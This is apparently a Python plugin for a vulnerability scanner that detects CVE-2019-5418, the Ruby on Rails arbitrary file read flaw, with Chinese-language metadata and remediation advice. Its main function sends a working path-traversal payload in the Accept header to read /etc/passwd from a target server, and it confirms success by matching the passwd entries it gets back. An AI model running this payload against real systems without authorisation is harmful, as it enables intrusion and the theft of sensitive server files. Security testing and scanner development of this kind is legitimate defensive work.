#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/11/29 22:12 PM'
import urllib.parse
import requests
import ClassCongregation

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-5418" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-12-3"  # 插件编辑时间
        self.info['disclosure'] = '2019-3-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['version'] = "Rails<6.0.0.beta3\r\nRails<5.2.2.1\r\nRails<5.1.6.2\r\nRails<5.0.7.2"  # 这边填漏洞影响的版本
        self.info['algroup'] = "RubyOnRailsArbitraryFileReading"  # 插件名称
        self.info['name'] ='RubyOnRails任意文件读取' #漏洞名称
        self.info['affects'] = "Rails"  # 漏洞组件
        self.info['desc_content'] = "漏洞来源于ActionView组件,攻击者可构造特定的Accept请求头与render_file:调用结合利用，可导致目标服务器上的任意文件被渲染导致敏感信息泄露。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "1.推荐方案：升级Rails版本\r\n2.缓解方案：强制修改使用了renderfile:调用的代码，指定要渲染的文件格式（formats），避免不必要的文件泄露"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = "../../../../../../../../etc/passwd{{"
        payload_url = url + "/robots"

        Headers['Accept']=payload
        Headers['Content-Type']='application/x-www-form-urlencoded'


        s = requests.session()
        resp = s.get(payload_url, headers=Headers,timeout=5, proxies=proxies,verify=False)
        con=resp.text
        code = resp.status_code
        if code== 200 and con.find('root:') != -1 and con.find('bin:') != -1 and con.find('sys:') != -1 and con.find('sync:') != -1 :
            Medusa = "{} 存在RubyOnRails任意文件读取(CVE-2019-5418)\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con.encode(encoding='utf-8'))
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

